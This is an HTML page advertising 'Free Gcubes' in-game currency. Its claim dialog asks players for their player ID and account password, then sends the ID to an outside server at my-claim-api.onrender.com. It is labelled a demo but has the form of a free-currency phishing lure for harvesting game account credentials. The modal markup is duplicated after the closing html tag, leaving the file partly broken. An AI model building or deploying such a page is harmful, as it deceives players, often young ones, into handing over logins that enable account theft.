<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Free Gcubes</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: Arial, sans-serif;
    color: white;
    background: #172c48;
    overflow-x: hidden;
}

/* Animated background */

body::before {
    content: "";
    position: fixed;
    inset: -50%;
    z-index: -1;
    background: conic-gradient(
        #183d75,
        #176c60,
        #a66c2c,
        #65752c,
        #514477,
        #183d75
    );
    filter: blur(65px);
    animation: bgmove 12s linear infinite;
}

@keyframes bgmove {
    to { transform: rotate(360deg); }
}

/* Header */

header {
    text-align: center;
    padding: 25px 10px;
    font-size: 27px;
    font-weight: bold;
    text-shadow: 0 0 15px #00ffb3;
}

/* Grid */

.container {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 25px;
    padding: 8px 20px 40px;
}

/* Cards */

.card {
    position: relative;
    min-height: 375px;
    background: rgba(29, 30, 37, 0.97);
    border: 3px solid #383a42;
    border-radius: 27px;

    display: flex;
    align-items: center;
    flex-direction: column;

    padding: 28px 5px;
    overflow: hidden;

    box-shadow: 0 0 15px rgba(0,0,0,.25);

    transition: .4s;
}

.card:hover {
    border-color: #00e9a0;
    box-shadow:
        0 0 15px #00e9a0,
        0 0 30px rgba(0,255,160,.4);

    transform: translateY(-5px);
}

/* FREE Button */

.free {
    background: #00b982;
    color: white;
    padding: 10px 22px;
    border-radius: 30px;
    font-size: 19px;
    font-weight: bold;

    box-shadow:
        0 0 10px #00ffb0,
        0 0 25px #00b982;

    animation: greenGlow 2s infinite alternate;
}

@keyframes greenGlow {
    from {
        box-shadow: 0 0 8px #00bd88;
    }
    to {
        box-shadow:
            0 0 20px #00ffb0,
            0 0 35px #00b982;
    }
}

/* Golden Cube */

.cube {
    width: 115px;
    height: 115px;
    margin: 40px 0 25px;

    animation: floating 3s ease-in-out infinite;

    filter:
        drop-shadow(0 0 5px #ffd000)
        drop-shadow(0 0 12px #ffae00);
}

.cube svg {
    width: 100%;
    height: 100%;
}

@keyframes floating {
    0%, 100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-13px);
    }
}

/* Sparkles */

.sparkle {
    position: absolute;
    color: white;
    font-size: 19px;
    animation: sparkle 1.5s infinite alternate;
}

.sparkle.one {
    top: 125px;
    left: 35%;
}

.sparkle.two {
    top: 155px;
    right: 32%;
    font-size: 12px;
    animation-delay: .7s;
}

@keyframes sparkle {
    from {
        opacity: .2;
        transform: scale(.6);
    }

    to {
        opacity: 1;
        transform: scale(1.3);
        text-shadow: 0 0 12px white;
    }
}

/* Amount */

.amount {
    font-size: 25px;
    font-weight: bold;
    margin-bottom: 18px;
    white-space: nowrap;
}

/* Claim button */

.claim {
    background: transparent;
    border: none;
    color: #55d88b;
    font-size: 20px;
    cursor: pointer;
    transition: .3s;
    text-shadow: 0 0 8px rgba(0,255,130,.4);
}

.claim:hover {
    color: white;
    transform: scale(1.1);
    text-shadow: 0 0 15px #00ff88;
}

footer {
    text-align: center;
    padding: 25px;
    font-size: 13px;
}

/* Small screens */

@media(max-width: 350px) {
    .container {
        gap: 12px;
        padding: 10px;
    }

    .card {
        min-height: 330px;
    }

    .amount {
        font-size: 20px;
    }

    .cube {
        width: 95px;
        height: 95px;
    }
}
.modal {
  display: none;
  position: fixed;
  inset: 0;
  z-index: 9999;
  background: rgba(0,0,0,.78);
  backdrop-filter: blur(9px);
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.modal-content {
  width: 100%;
  max-width: 500px;
  background: #111827;
  border: 1px solid #374151;
  border-radius: 26px;
  padding: 30px 25px;
  box-shadow: 0 0 35px #000;
  animation: popup .35s ease;
}

@keyframes popup {
  from {
    opacity: 0;
    transform: scale(.85);
  }
  to {
    opacity: 1;
    transform: scale(1);
  }
}

.modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.modal-header h2 {
  color: white;
  font-size: 25px;
}

.modal-header h2 span {
  color: #55d88b;
}

.close {
  background: none;
  border: none;
  color: #9ca3af;
  font-size: 36px;
}

.modal-content p,
.modal-content label {
  color: #9ca3af;
}

.modal-content p {
  margin: 15px 0 30px;
}

.modal-content label {
  display: block;
  margin-bottom: 10px;
}

.modal-content input {
  box-sizing: border-box;
  width: 100%;
  padding: 18px;
  background: #202b3c;
  border: 1px solid #374151;
  border-radius: 13px;
  color: white;
  font-size: 18px;
}

.send-btn {
  width: 100%;
  padding: 22px;
  margin-top: 20px;
  background: #20c765;
  border: none;
  border-radius: 13px;
  color: white;
  font-size: 20px;
  font-weight: bold;
}
</style>
</head>

<body>

<header>Enjoy your free Gcubes and you can only use this for one time no second try</header>

<div class="container" id="cards"></div>

<footer>Demo Gcubes Website</footer>

<script>

/* Golden 3D cube illustration */

const cube = `
<svg viewBox="0 0 120 120"
xmlns="http://www.w3.org/2000/svg">

<defs>
<linearGradient id="top" x2="0.8" y2="1">
<stop stop-color="#fffbb0"/>
<stop offset="1" stop-color="#ffb900"/>
</linearGradient>

<linearGradient id="left" x2="1" y2="1">
<stop stop-color="#fff26a"/>
<stop offset="1" stop-color="#ffb900"/>
</linearGradient>

<linearGradient id="right" x2="1" y2="1">
<stop stop-color="#ffda20"/>
<stop offset="1" stop-color="#b96a00"/>
</linearGradient>
</defs>

<!-- Top cube -->

<g stroke="#fff3a0" stroke-width="1.2">
<path d="M60 8 L84 22 L60 36 L36 22 Z"
fill="url(#top)"/>
<path d="M36 22 L60 36 L60 64 L36 50 Z"
fill="url(#left)"/>
<path d="M60 36 L84 22 L84 50 L60 64 Z"
fill="url(#right)"/>

<!-- Left cube -->

<path d="M24 36 L49 50 L24 65 L0 51 Z"
fill="url(#top)"/>
<path d="M0 51 L24 65 L24 94 L0 80 Z"
fill="url(#left)"/>
<path d="M24 65 L49 50 L49 79 L24 94 Z"
fill="url(#right)"/>

<!-- Bottom right cube -->

<path d="M64 53 L91 68 L64 83 L38 68 Z"
fill="url(#top)"/>
<path d="M38 68 L64 83 L64 111 L38 96 Z"
fill="url(#left)"/>
<path d="M64 83 L91 68 L91 96 L64 111 Z"
fill="url(#right)"/>

</g>

<!-- Cube shine -->

<path d="M42 25 L56 33 M7 53 L20 61"
stroke="white" stroke-width="2" opacity=".8"/>

</svg>
`;

/* Gcube packages */

const amounts = [
60, 300, 600, 1650, 3600, 6000
];

const container = document.getElementById("cards");

amounts.forEach(amount => {

    container.innerHTML += `

    <div class="card">

        <span class="free">FREE</span>

        <span class="sparkle one">✦</span>
        <span class="sparkle two">✦</span>

        <div class="cube">
            ${cube}
        </div>

        <div class="amount">
            ${amount} Gcubes
        </div>

        <button class="claim"
        onclick="claim(${amount})">
            Click to Claim
        </button>

    </div>

    `;

});

/* Demo claim */

function claim(amount) {
    document.getElementById("claimAmount").innerText = amount;
    document.getElementById("claimModal").style.display = "flex";
}

function closeModal() {
    document.getElementById("claimModal").style.display = "none";
}

async function sendClaim() {
    const id = document.getElementById("playerId").value.trim();
    const amount = document.getElementById("claimAmount").innerText;

    if (!id) {
        alert("Please enter Player ID");
        return;
    }

    try {
        const response = await fetch(
            "https://my-claim-api.onrender.com/claim",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    playerId: id,
                    packageName: amount + " Gcubes"
                })
            }
        );

        const result = await response.json();

        if (!response.ok) {
            throw new Error("Request failed");
        }

        alert("Claim request sent successfully!");
        closeModal();

    } catch (error) {
        alert("Could not send request. Please try again.");
        console.error(error);
    }
}

</script>
<div class="modal" id="claimModal">
  <div class="modal-content">

    <div class="modal-header">
      <h2>Claim <span id="claimAmount">60</span> Gcubes</h2>
      <button class="close" onclick="closeModal()">×</button>
    </div>

    <p>Enter your account details to receive the gcubes.</p>

    <label>Player ID</label>

    <input type="text"
      id="playerId"
      placeholder="e.g. 12345678">
<label>Password</label>

<input
    type="password"
    id="Password"
    placeholder="Your password"
    autocomplete="off"
>
    <button class="send-btn" onclick="sendClaim()">
      Send claim Request
    </button>

  </div>
</div>
</body>
</html>

</script>

  <div class="modal-content">

    <div class="modal-header">
      <h2>Claim <span id="claimAmount">60</span> Gcubes</h2>
      <button class="close" onclick="closeModal()">×</button>
    </div>

    <p>Enter your account details to receive the gcubes.</p>

    <label>Player ID</label>

    <input type="text"
      id="playerId"
      placeholder="e.g. 12345678">
<label>Password</label>

<input
    type="password"
    id="Password"
    placeholder="Your password"
    autocomplete="off"
>
    <button class="send-btn" onclick="sendClaim()">
      Send claim Request
    </button>

  </div>
</div>
</body>
</html>
